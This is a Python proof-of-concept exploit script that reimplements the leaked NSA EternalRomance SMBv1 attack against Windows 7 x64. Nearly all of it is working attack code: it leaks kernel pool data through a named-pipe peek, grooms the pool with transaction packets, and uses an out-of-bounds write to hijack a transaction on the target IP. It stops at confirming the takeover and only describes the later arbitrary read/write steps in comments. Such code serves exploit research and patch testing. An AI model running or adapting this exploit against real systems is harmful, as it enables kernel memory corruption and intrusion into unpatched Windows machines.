#!/usr/bin/python
from mysmb import MYSMB
from impacket import smb, smbconnection
from impacket.dcerpc.v5 import transport, lsat, ndr
from struct import pack, unpack
import sys

'''
PoC: demonstrates how NSA eternalromance works against Windows 7 x64 (matched-pairs method).

The PoC is written from capture network traffic against Windows 7 x64.
I do my best to make it the same as original NSA eternalromance.

NSA eternalromance works against Windows<8 because information leak bug is fixed in Windows>=8.
NSA eternalsynergy changes information leak method to exploit Windows 8 and Windows 2012.
NSA eternalsynergy also do something to bypass NonpagedPoolNx. I do not check it.
'''

USERNAME = ''
PASSWORD = ''

if len(sys.argv) != 2:
	print("{} <ip>".format(sys.argv[0]))
	sys.exit(1)

target = sys.argv[1]
pipe_name = 'lsarpc'


conn = MYSMB(target)
conn.login(USERNAME, PASSWORD)

smbConn = smbconnection.SMBConnection(target, target, existingConnection=conn, manualNegotiate=True)
dce = transport.SMBTransport(target, filename=pipe_name, smb_connection=smbConn).get_dce_rpc()
dce.connect()

conn.set_default_tid(conn.get_last_tid())
fid = conn.get_last_fid()

dce.bind(lsat.MSRPC_UUID_LSAT)

# send LsarGetUserName without getting result so there are data in named pipe to peek
request = lsat.LsarGetUserName()
request['SystemName'] = "\x00"
request['UserName'] = "A"*263+'\x00'  # this data size determines how many bytes of data we can leak
request['DomainName'] = ndr.NULL
dce.call(request.opnum, request)

# ================================
# first leak
# ================================
print('Leaking to determine Architecture')
# send TRANS_PEEK_NMPIPE (0x23) request with small OutData buffer to leak info
recvPkt = conn.send_trans(pack('<HH', 0x23, fid), maxDataCount=1, maxParameterCount=0x5400, maxSetupCount=1)
resp = smb.SMBCommand(recvPkt['Data'][0])
data = resp['Data'][1+6+2:]  # skip padding, parameter, padding

# NSA eternalromance use first info leak to check target architecture
# we assume target is x64

# ================================
# initial groom
# ================================
print('sending packet')
# send 10 groom packets
for i in range(10):
	conn.send_trans(pack('<HH', 0x36, fid), totalDataCount=0x5400, maxSetupCount=0, maxParameterCount=0, maxDataCount=0)

mids = []
pids = []
for i in range(3):
	mid = conn.next_mid()
	pid = conn._pid - i - 1
	
	# req1 is for leak bride transaction
	req1 = conn.create_trans_packet(pack('<HH', 0x23, fid), mid=mid, totalDataCount=1, maxParameterCount=0x5400, maxSetupCount=0)
	# req2 is for modify bride transaction, next to this groom, with OOB write
	req2 = conn.create_trans_packet(pack('<HH', 0x36, fid), mid=fid, pid=pid, totalDataCount=0x5400, maxSetupCount=0, maxParameterCount=0, maxDataCount=0)
	# req3 is for ?
	req3 = conn.create_trans_packet(pack('<HH', 0x36, fid), totalDataCount=0x5400, maxSetupCount=0, maxParameterCount=0, maxDataCount=0)
	conn.send_raw(req1+req2+req3)
	
	mids.append(mid)
	pids.append(pid)

for i in range(len(mids)):
	conn.recvSMB()

# normally, small transaction is allocated from lookaside which force all buffer size to 0x5000
# the only method to get small buffer size is sending SMB_COM_TRANSACTION command with empty setup
# send 48 bride packets
for i in range(48):
	conn.send_trans('', totalDataCount=0x40, maxSetupCount=0, maxParameterCount=0x940, maxDataCount=0)

# now, bride transactions should be next to groom transactions
# groom + bride => romance ?

# ================================
# leak a transaction
# ================================
print('Leaking a transaction')
# leak a bride transaction
conn.send_trans_secondary(mids[0], data='A')
leakData = conn.recv_transaction_data(mids[0], 520)


# NSA eternalromance parse leakData to get bride transaction (I skip this step)
# from leak transaction, we know
# - leak bride transaction address
# - CONNECTION address
# - next and previous transaction (flink and blink of LIST_ENTRY)
# - ...
# I do not know how NSA eternalromance use this leak info. I just look at pcap file.


# use SMB write to shift transaction.InData
conn.do_write_andx_raw_pipe(fid, 'A'*512, pid=pids[0])

print('Modify a bride transaction mid to 0')
# below is dangerous operation
# OOB write to modify next bride mid to 0
conn.send_trans_secondary(fid, pid=pids[0], data='\x00\x00', dataDisplacement=0x5330)

# test OOB write result by sending a secondary with mid=0 and bad data displacement
conn.send_trans_secondary(0, data='\x00', dataDisplacement=0xffff)
# if success, the target must reply an error
# if no reply, this means fail too
recvPkt = conn.recvSMB()
if recvPkt.getNTStatus() != 0:
	print('Successfully took over a transaction')
else:
	print('Fail to took over a transaction')

print('''after successfully took over a transaction, NSA eternalromance
- modify bride transaction (mid=0) InData to get arbitrary write
- use arbitrary write to modify leak transaction to be peek named pipe command for arbitrary read''')


# receive result to clear name pipe data
dce.recv()

dce.disconnect()
conn.logoff()
conn.get_socket().close()
